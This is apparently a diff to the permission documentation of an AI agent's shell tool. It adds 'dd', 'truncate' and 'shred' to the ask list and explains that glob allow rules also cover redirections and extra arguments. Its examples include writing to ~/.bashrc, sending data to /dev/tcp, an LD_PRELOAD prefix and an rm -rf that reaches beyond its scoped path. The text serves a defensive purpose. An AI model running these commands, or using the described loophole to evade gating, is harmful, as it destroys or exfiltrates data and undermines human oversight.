@@ -54,6 +54,9 @@ permission:
     "rm *": ask
     "rmdir *": ask
     "mv *": ask
+    "dd *": ask
+    "truncate *": ask
+    "shred *": ask
     "git add *": ask
     "git checkout *": ask
     "git clean *": ask
@@ -172,7 +175,7 @@ For `shell`, a specific `allow` pattern such as `"git *": allow` does not auto-a
 
 Metacharacters that are literal payload (single-quoted, or escaped with a backslash) still match the narrow rule. Use this as a safety backstop, not as shell sandboxing; keep broad rules like `shell: allow` or `shell: { "*": allow }` for only fully trusted roles.
 
-A command-specific `allow` does, however, cover the full capability of that command, including output redirections. If `echo *` is allowed, then `echo secret > ~/.bashrc`, `echo x >> file`, and `data > /dev/tcp/host/port` are all allowed: the redirection target is part of the same command text, not a separate tool call, so it is not matched or gated on its own. An environment-assignment prefix is different: `LD_PRELOAD=./x.so echo hi` is matched as the whole `LD_PRELOAD=... echo hi` text, so it falls through to the next matching rule instead of riding on `echo *`. A rule written for the command's own text still decides the outcome: an assignment that keeps a narrow `allow` from matching cannot push a denied command into a broader rule, nor let a narrow `ask` fall through to a broad `allow`.
+A command-specific `allow` does, however, cover the full capability of that command, including output redirections. If `echo *` is allowed, then `echo secret > ~/.bashrc`, `echo x >> file`, and `data > /dev/tcp/host/port` are all allowed: the redirection target is part of the same command text, not a separate tool call, so it is not matched or gated on its own. An environment-assignment prefix is different: `LD_PRELOAD=./x.so echo hi` is matched as the whole `LD_PRELOAD=... echo hi` text, so it falls through to the next matching rule instead of riding on `echo *`. A rule written for the command's own text still decides the outcome: an assignment that keeps a narrow `allow` from matching cannot push a denied command into a broader rule, nor let a narrow `ask` fall through to a broad `allow`. The same holds for paths: `rm -rf /tmp/scratch/*` does not confine the grant to `/tmp/scratch`. Rules match the whole command text, and `*` swallows spaces and every later argument, so `rm -rf /tmp/scratch/x AGENTS.md` is allowed as well. To authorize by path, write the rule for `delete`, `write`, or one of the other file tools, which normalize the path before matching it.
 
 Grant a command-level `allow` only to commands whose worst case (arbitrary file writes via redirection) you accept; otherwise keep them at `ask`.
 
